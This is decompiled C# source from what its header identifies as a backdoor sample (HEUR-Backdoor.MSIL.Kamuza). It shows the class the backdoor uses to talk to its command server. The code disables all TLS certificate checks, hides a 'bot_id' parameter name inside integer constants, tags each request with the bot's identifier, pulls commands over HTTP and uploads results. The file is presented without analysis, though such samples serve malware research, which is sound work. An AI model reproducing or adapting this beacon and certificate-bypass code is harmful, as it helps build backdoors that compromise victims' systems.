// Decompiled with JetBrains decompiler
// Type: JSS.AppHttp
// Assembly: JSS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA27710C-27FC-4B6B-9AFB-DB45D81E1E20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Backdoor.MSIL.Kamuza.gen-dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d.exe

using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace JSS
{
  internal class AppHttp
  {
    private static WebClient wCli = new WebClient();

    public AppHttp()
    {
      AppHttp.wCli = new WebClient();
      ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(AppHttp.ValidateRemoteCertificate);
    }

    private static bool ValidateRemoteCertificate(
      object sender,
      X509Certificate cert,
      X509Chain chain,
      SslPolicyErrors error)
    {
      return true;
    }

    public string Get(string theUrl)
    {
      try
      {
        AppHttp.wCli.Headers.Add("Accept", "text/html");
        AppHttp.wCli.QueryString.Clear();
        byte[] bytes = AppInfo.Combine(BitConverter.GetBytes(1601466210), BitConverter.GetBytes(25705));
        string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length - 2);
        AppHttp.wCli.QueryString.Add(name, AppParams.ProgID);
        return AppHttp.wCli.DownloadString(theUrl);
      }
      catch (Exception ex)
      {
        if (ex is WebException)
        {
          if ((((WebException) ex).Response as HttpWebResponse).StatusCode == HttpStatusCode.NotFound)
            return "";
        }
        else
          throw;
      }
      return "";
    }

    public void Put(string theUrl, string theAnswer)
    {
      try
      {
        AppHttp.wCli.Headers.Add("Content-type", "application/json");
        AppHttp.wCli.QueryString.Clear();
        byte[] bytes = AppInfo.Combine(BitConverter.GetBytes(1601466210), BitConverter.GetBytes(25705));
        string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length - 2);
        AppHttp.wCli.QueryString.Add(name, AppParams.ProgID);
        AppHttp.wCli.UploadString(theUrl, theAnswer);
      }
      catch
      {
        throw;
      }
    }
  }
}
